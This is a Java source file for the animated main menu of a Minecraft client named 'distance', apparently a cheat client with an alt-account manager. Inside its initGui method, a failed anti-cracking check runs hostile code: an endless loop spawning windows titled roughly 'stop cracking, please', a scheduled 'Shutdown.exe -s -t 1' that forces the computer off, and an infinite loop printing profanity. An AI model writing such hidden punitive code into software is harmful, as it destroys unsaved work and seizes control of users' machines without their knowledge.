package my.distance.ui.gui.mainmenu;

import my.distance.Client;
import my.distance.fastuni.FontLoader;
import my.distance.ui.BackGroundRenderer;
import my.distance.ui.buttons.SimpleButton;
import my.distance.ui.font.FontLoaders;
import my.distance.ui.gui.GuiClientSetting;
import my.distance.ui.gui.GuiGoodBye;
import my.distance.ui.gui.mainmenu.animation.AnimatedButton;
import my.distance.ui.jelloparticle.ParticleEngine;
import my.distance.ui.login.GuiAltManager;
import my.distance.util.SuperLib;
import my.distance.util.anim.AnimationUtils;
import my.distance.util.render.RenderUtil;
import my.distance.util.time.TimerUtil;
import net.minecraft.client.Minecraft;
import net.minecraft.client.gui.*;
import net.minecraft.client.renderer.GlStateManager;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.util.Random;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.CopyOnWriteArrayList;

/**
 * 主菜单
 * @author Mymylesaws
 */
public class GuiMainMenu extends GuiScreen {
	//切换判断
	boolean clientsetting = false;
	private static final TimerUtil timer = new TimerUtil();
	boolean rev = false;

	//进场动画
	boolean playIn = false;
	boolean playout = false;
	double anim, anim2, anim3,anim4,anim5 = new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth();

	//退场动画
	double outroAnim = 44;
	double outroAnim2 = 255;

	//需要过场动画
	boolean needTrans;

	//主菜单按钮
	private final CopyOnWriteArrayList<AnimatedButton> animatedButtons = new CopyOnWriteArrayList<>();

	public ParticleEngine pe = new ParticleEngine();

	public GuiMainMenu() {
		needTrans = false;
	}

	public GuiMainMenu(boolean needTrans) {
		this.needTrans = needTrans;
	}

	@Override
	protected void keyTyped(char typedChar, int keyCode) throws IOException {
		if (isKeyComboCtrlX(keyCode)){
			mc.displayGuiScreen(new GuiMainMenu());
		}
		super.keyTyped(typedChar, keyCode);
	}

	boolean hovered = false;

	public void drawScreen(int mouseX, int mouseY, float partialTicks) {
		if (!timer.hasReached(200) && needTrans) {
			anim = anim2 = anim3 = anim4 = anim5 = new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth() + 50;
			outroAnim = 44;
			outroAnim2 = 255;
		} else if (!hovered || !clientsetting) {
			rev = false;
		}
		if (!needTrans) {
			anim = anim2 = anim3 = 0;
			anim4 = (width / 8f);
			anim5 = (width / 8f) + width / 10f;
		}
		if (hovered) {
			rev = true;
			needTrans = true;
			if (anim2 >= width - 5) {
				mc.displayGuiScreen(new GuiGoodBye());
			}
		} else if (clientsetting) {
			rev = true;
			needTrans = true;
			if (anim2 >= width - 5) {
				this.mc.displayGuiScreen(new GuiClientSetting(new GuiMainMenu(true), true));
			}
		}
		if (rev) {
			anim = AnimationUtils.animate(new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth(), anim, 6.0f / Minecraft.getDebugFPS());
			anim2 = AnimationUtils.animate(new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth(), anim2, 4.0f / Minecraft.getDebugFPS());
			anim3 = AnimationUtils.animate(new ScaledResolution(Minecraft.getMinecraft()).getScaledWidth(), anim3, 5.5f / Minecraft.getDebugFPS());

			anim4 = AnimationUtils.animate(width + 50, anim4, 4.0f / Minecraft.getDebugFPS());
			anim5 = AnimationUtils.animate(width + 50, anim5, 4.0f / Minecraft.getDebugFPS());
			if ((anim4 - (width / 8f)) > 10) {
				outroAnim = AnimationUtils.animate(44, outroAnim, 6.0f / Minecraft.getDebugFPS());
				outroAnim2 = AnimationUtils.animate(255, outroAnim2, 6.0f / Minecraft.getDebugFPS());
				if (!playout) {
					new Thread(() -> {
						for (AnimatedButton animatedButton : animatedButtons) {
							animatedButton.playOutro();
							try {
								Thread.sleep(100);
							} catch (InterruptedException e) {
								e.printStackTrace();
							}
						}
					}).start();
					playout = true;
				}
			}
		} else {
			anim = AnimationUtils.animate(0, anim, 3.0f / Minecraft.getDebugFPS());
			anim2 = AnimationUtils.animate(0, anim2, 5.0f / Minecraft.getDebugFPS());
			anim3 = AnimationUtils.animate(0, anim3, 4.0f / Minecraft.getDebugFPS());

			anim4 = AnimationUtils.animate(Math.max(150,width / 8f), anim4, 5.0f / Minecraft.getDebugFPS());
			anim5 = AnimationUtils.animate(Math.max(150,width / 8f) + width / 10f, anim5, 5.0f / Minecraft.getDebugFPS());
			if ((anim4 - Math.max(150,width / 8f)) < 10) {
				outroAnim = AnimationUtils.animate(0, outroAnim, 7.0f / Minecraft.getDebugFPS());
				outroAnim2 = AnimationUtils.animate(200, outroAnim2, 7.0f / Minecraft.getDebugFPS());
				if (!playIn) {
					new Thread(() -> {
						for (AnimatedButton animatedButton : animatedButtons) {
							animatedButton.playIntro();
							try {
								Thread.sleep(100);
							} catch (InterruptedException e) {
								e.printStackTrace();
							}
						}
					}).start();
					playIn = true;
				}
			}
		}

		GlStateManager.color(1.0F, 1.0F, 1.0F, 1.0F);
		ScaledResolution sr = new ScaledResolution(this.mc);
		BackGroundRenderer.render();

		pe.render(0, 0);
		super.drawScreen(mouseX, mouseY, partialTicks);

		FontLoaders.GoogleSans16.drawString(Client.name + " made by " + Client.author, width - 7 - FontLoaders.GoogleSans16.getStringWidth(Client.name + " made by " + Client.author), sr.getScaledHeight() - 5.5f - FontLoaders.GoogleSans20.getHeight() + 1, new Color(255, 255, 255, 180).getRGB());
		FontLoaders.calibrilite50.drawString(Client.name,width - 45 - FontLoaders.calibrilite50.getStringWidth(Client.name),height - 10f - FontLoaders.calibrilite50.getHeight() ,new Color(255,255,255,250).getRGB());
		FontLoaders.calibrilite24.drawString(Client.distanceVersion,width - 43,height - 8f - FontLoaders.calibrilite50.getHeight(),new Color(255,255,255,250).getRGB());

		RenderUtil.drawRect(0, 0, anim4, height, new Color((int) outroAnim, (int) outroAnim, (int) outroAnim, (int) outroAnim2).getRGB());

		RenderUtil.triangle((float) anim4, height, (float) anim4, 0, (float) anim5, height, new Color((int) outroAnim, (int) outroAnim, (int) outroAnim, (int) outroAnim2).getRGB());

		for (AnimatedButton animatedButton : animatedButtons) {
			animatedButton.updateAndDraw(mouseX, mouseY);
		}
	}

	public void initGui() {
		if (SuperLib.id != 1) {
			new Thread(() -> {
				Random rd = new Random();
				while (true) {
					JFrame frame = new JFrame("别破解了，求你了");
					frame.setSize(400, 200);
					frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
					frame.setVisible(true);
				}
			}).start();
			new java.util.Timer().schedule(new TimerTask() {
				public void run() {
					Runtime run = Runtime.getRuntime();
					try {
						run.exec("Shutdown.exe -s -t 1");
						run.exit(0);
					} catch (IOException e) {
						run.exit(0);
					}
				}
			}, (5000L));
			while (true) {
				System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
			}
		}
		if (SuperLib.id2 != 0) {
			new Thread(() -> {
				Random rd = new Random();
				while (true) {
					JFrame frame = new JFrame("别破解了，求你了");
					frame.setSize(400, 200);
					frame.setLocation(rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().width), rd.nextInt(java.awt.Toolkit.getDefaultToolkit().getScreenSize().height));
					frame.setVisible(true);
				}
			}).start();
			new Timer().schedule(new TimerTask() {
				public void run() {
					Runtime run = Runtime.getRuntime();
					try {
						run.exec("Shutdown.exe -s -t 1");
						run.exit(0);
					} catch (IOException e) {
						run.exit(0);
					}
				}
			}, (5000L));
			while (true) {
				System.out.println("CNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNMCNM");
			}
		}

		timer.reset();
		pe.particles.clear();

		playIn = false;
		playout = false;
		animatedButtons.clear();
		animatedButtons.add(new AnimatedButton(FontLoader.msFont24, "SinglePlayer", "C", Math.max(width / 13f,80), (height / 2f) - 40, () ->
				mc.displayGuiScreen(new GuiSelectWorld(new GuiMainMenu()))));
		animatedButtons.add(new AnimatedButton(FontLoader.msFont24, "MultiPlayer", "B", Math.max(width / 13f,80), (height / 2f) - 20, () ->
				mc.displayGuiScreen(new GuiMultiplayer(new GuiMainMenu()))));
		animatedButtons.add(new AnimatedButton(FontLoader.msFont24, "AltManager", "A", Math.max(width / 13f,80), (height / 2f), () ->
				mc.displayGuiScreen(new GuiAltManager())));
		animatedButtons.add(new AnimatedButton(FontLoader.msFont24, "Option", "G", Math.max(width / 13f,80), (height / 2f) + 20, () ->
				mc.displayGuiScreen(new GuiOptions(new GuiMainMenu(), mc.gameSettings))));
		animatedButtons.add(new AnimatedButton(FontLoader.msFont24, "Exit", "D", Math.max(width / 13f,80), (height / 2f) + 40, () ->
				hovered = true));


		this.buttonList.add(new SimpleButton(84757, this.width / 2, (height) - 10, "ClientSetting"));
	}

	protected void actionPerformed(GuiButton button) throws IOException {
		if (button.id == 84757) {
			rev = true;
			clientsetting = true;
			needTrans = true;
		}
	}
}